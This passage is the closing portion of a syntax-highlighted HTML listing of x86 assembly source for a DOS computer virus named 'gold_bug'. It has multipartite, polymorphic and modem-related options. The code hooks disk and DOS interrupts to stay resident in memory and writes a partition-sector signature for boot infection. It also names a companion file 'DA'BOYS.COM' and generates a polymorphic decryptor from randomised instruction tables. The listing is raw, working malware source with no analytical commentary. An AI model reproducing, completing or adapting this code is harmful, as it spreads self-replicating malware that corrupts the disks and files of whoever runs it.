        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">QUERY_FREE_HMA</span><span class="sc0">

        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">MULTIPLEX_INT</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc9">high</span><span class="sc4">(</span><span class="sc5">MIN_FILE_SIZE</span><span class="sc4">+</span><span class="sc5">SECTOR_SIZE</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">another_return</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">ALLOCATE_HMA</span><span class="sc0">

        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">MULTIPLEX_INT</span><span class="sc0">

        </span><span class="sc6">clc</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">full_move_w_di</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int_13_start</span><span class="sc4">+</span><span class="sc5">RELATIVE_OFFSET</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_13_chain</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">VIRGIN_INT_2F</span><span class="sc4">-</span><span class="sc5">SET_INT_OFFSET</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">interrupt_2f</span><span class="sc4">+</span><span class="sc5">RELATIVE_OFFSET</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_interrupt</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">LOW_JMP_10</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">

        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">set_10_back</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">DOS_INT_ADDR</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">INT_21_IS_NOW</span><span class="sc4">*</span><span class="sc5">ADDR_MUL</span><span class="sc4">-</span><span class="sc5">SET_INT_OFFSET</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_n_set_int</span><span class="sc4">+</span><span class="sc5">ONE_BYTE</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">old_int_10_21</span><span class="sc4">-</span><span class="sc5">SET_INT_OFFSET</span><span class="sc4">+</span><span class="sc5">RELATIVE_OFFSET</span><span class="sc4">+</span><span class="sc5">ONE_BYTE</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_interrupt</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">DOS_SET_INT</span><span class="sc4">+</span><span class="sc5">DOS_INT</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">LOW_JMP_21</span><span class="sc0">

        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">INT_21_IS_NOW</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">interrupt_21</span><span class="sc4">+</span><span class="sc5">RELATIVE_OFFSET</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">0b450h</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">TWO_BYTES</span><span class="sc4">],</span><span class="sc2">0cd19h</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">FOUR_BYTES</span><span class="sc4">],</span><span class="sc2">05800h</span><span class="sc4">+</span><span class="sc5">INT_21_IS_NOW</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_int_10_21</span><span class="sc0">

</span><span class="sc5">set_10_back</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">old_int_10_21</span><span class="sc4">+</span><span class="sc5">RELATIVE_OFFSET</span><span class="sc4">+</span><span class="sc5">ONE_BYTE</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">LOW_JMP_10</span><span class="sc4">-</span><span class="sc5">FAR_JUMP_OFFSET</span><span class="sc0">

</span><span class="sc5">interrupt_10</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">



</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">



</span><span class="sc5">get_n_set_int</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">

        </span><span class="sc6">les</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">set_interrupt</span><span class="sc0">

</span><span class="sc5">set_int_10_21</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">FAR_JUMP_OFFSET</span><span class="sc4">],</span><span class="sc5">FAR_JUMP</span><span class="sc0">

</span><span class="sc5">set_interrupt</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">SET_INT_OFFSET</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">CHANGE_SEG_OFF</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">get_n_set_int</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">



</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">



        </span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc5">MULTIPARTITE</span><span class="sc0">

</span><span class="sc5">set_both_ints</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,(</span><span class="sc5">NEW_INT_13_LOOP</span><span class="sc4">*</span><span class="sc5">ADDR_MUL</span><span class="sc4">)-</span><span class="sc5">SET_INT_OFFSET</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_n_set_int</span><span class="sc4">+</span><span class="sc5">ONE_BYTE</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc9">low</span><span class="sc4">(</span><span class="sc5">BIOS_INT_13</span><span class="sc4">*</span><span class="sc5">ADDR_MUL</span><span class="sc4">)-</span><span class="sc5">SET_INT_OFFSET</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">set_interrupt</span><span class="sc0">

</span><span class="sc5">set_both_ints</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

        </span><span class="sc9">ENDIF</span><span class="sc0">



</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">



        </span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc5">EXECUTE_SPAWNED</span><span class="sc0">

</span><span class="sc5">exec_table</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">COMMAND_LINE</span><span class="sc4">,</span><span class="sc5">FIRST_FCB</span><span class="sc4">,</span><span class="sc5">SECOND_FCB</span><span class="sc0">

        </span><span class="sc9">ENDIF</span><span class="sc0">



</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">



        </span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc5">MODEM_CODE</span><span class="sc0">

        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc5">PART_OFFSET</span><span class="sc4">+</span><span class="sc2">001f3h</span><span class="sc0">

</span><span class="sc5">string</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">CR</span><span class="sc4">,</span><span class="sc12">'1O7=0SLMTA'</span><span class="sc0">

        </span><span class="sc9">ENDIF</span><span class="sc0">



</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">



        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc5">PART_OFFSET</span><span class="sc4">+</span><span class="sc5">SECTOR_SIZE</span><span class="sc4">-</span><span class="sc5">TWO_BYTES</span><span class="sc0">

</span><span class="sc5">partition_sig</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0aa55h</span><span class="sc0">



</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">



        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc5">PART_OFFSET</span><span class="sc4">+</span><span class="sc5">SECTOR_SIZE</span><span class="sc4">+</span><span class="sc5">TWO_BYTES</span><span class="sc0">

</span><span class="sc5">file_name</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'DA'</span><span class="sc4">,</span><span class="sc2">027h</span><span class="sc4">,</span><span class="sc12">'BOYS.COM'</span><span class="sc4">,</span><span class="sc5">NULL</span><span class="sc0">



</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">



        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc5">PARAMETER_TABLE</span><span class="sc0">

        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc5">NULL</span><span class="sc4">,</span><span class="sc5">NULL</span><span class="sc4">,</span><span class="sc5">NULL</span><span class="sc4">,</span><span class="sc5">NULL</span><span class="sc4">,</span><span class="sc5">NULL</span><span class="sc4">,</span><span class="sc5">NULL</span><span class="sc4">,</span><span class="sc5">NULL</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">NULL</span><span class="sc0">



</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">



        </span><span class="sc9">IFE</span><span class="sc0"> </span><span class="sc5">MULTIPARTITE</span><span class="sc0">

</span><span class="sc5">boot_load</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">full_move_w_si</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">NEW_INT_13_LOOP</span><span class="sc4">*</span><span class="sc5">ADDR_MUL</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">dont_set_intcd</span><span class="sc0">

        </span><span class="sc6">lds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">VIRGIN_INT_13_B</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">DOS_SET_INT</span><span class="sc4">+</span><span class="sc5">NEW_INT_13_LOOP</span><span class="sc0">

        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">DOS_INT</span><span class="sc0">

</span><span class="sc5">dont_set_intcd</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc9">high</span><span class="sc4">(</span><span class="sc5">GET_DEFAULT_DR</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">DOS_INT</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">from_com_code</span><span class="sc4">+</span><span class="sc5">RELATIVE_OFFSET</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">TERMINATE_W_ERR</span><span class="sc0">

        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">DOS_INT</span><span class="sc0">

</span><span class="sc5">boot_load</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

        </span><span class="sc9">ENDIF</span><span class="sc0">



</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">



        </span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc5">POLYMORPHIC</span><span class="sc0">

</span><span class="sc5">load_it</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc5">FILE_SIGNATURE</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">TWO_BYTES</span><span class="sc4">],</span><span class="sc5">FIRST_UNDO_OFF</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">cli</span><span class="sc0">

        </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc2">043h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">in</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">040h</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">in</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">040h</span><span class="sc0">

        </span><span class="sc6">sti</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0001eh</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">two_byte_table</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">ROTATED_OFFSET</span><span class="sc4">+</span><span class="sc5">TWO_BYTES</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">REMOVE_NOP</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">003e0h</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc5">FIVE_BITS</span><span class="sc0">

        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">one_byte_table</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc9">low</span><span class="sc4">(</span><span class="sc5">INC_BL</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">swap_incbx_bl</span><span class="sc4">+</span><span class="sc5">THREE_BYTES</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">com_start</span><span class="sc0">

</span><span class="sc5">load_it</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">



</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">



</span><span class="sc5">two_byte_table</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b2h</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b4h</span><span class="sc0">

        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0d4h</span><span class="sc0">

        </span><span class="sc6">les</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">les</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">les</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0d4h</span><span class="sc0">

        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">084h</span><span class="sc0">

        </span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">084h</span><span class="sc0">

        </span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">024h</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">084h</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">014h</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">024h</span><span class="sc0">

        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">

        </span><span class="sc6">repz</span><span class="sc0">    </span><span class="sc6">stc</span><span class="sc0">

        </span><span class="sc6">repnz</span><span class="sc0">   </span><span class="sc6">stc</span><span class="sc0">



</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">



</span><span class="sc5">one_byte_table</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">SINGLE_BYTE_INT</span><span class="sc0">

        </span><span class="sc6">into</span><span class="sc0">

        </span><span class="sc6">daa</span><span class="sc0">

        </span><span class="sc6">das</span><span class="sc0">

        </span><span class="sc6">aaa</span><span class="sc0">

        </span><span class="sc6">aas</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">

        </span><span class="sc6">nop</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">cbw</span><span class="sc0">

        </span><span class="sc6">cwd</span><span class="sc0">

        </span><span class="sc6">lahf</span><span class="sc0">

        </span><span class="sc6">scasb</span><span class="sc0">

        </span><span class="sc6">scasw</span><span class="sc0">

        </span><span class="sc6">xlat</span><span class="sc0">

        </span><span class="sc6">repnz</span><span class="sc0">

        </span><span class="sc6">repz</span><span class="sc0">

        </span><span class="sc6">cmc</span><span class="sc0">

        </span><span class="sc6">clc</span><span class="sc0">

        </span><span class="sc6">stc</span><span class="sc0">

        </span><span class="sc9">ENDIF</span><span class="sc0">



</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">



</span><span class="sc5">gold_bug</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">cseg</span><span class="sc0">        </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">com_code</span><span class="sc0">

</span></div></body>
</html>
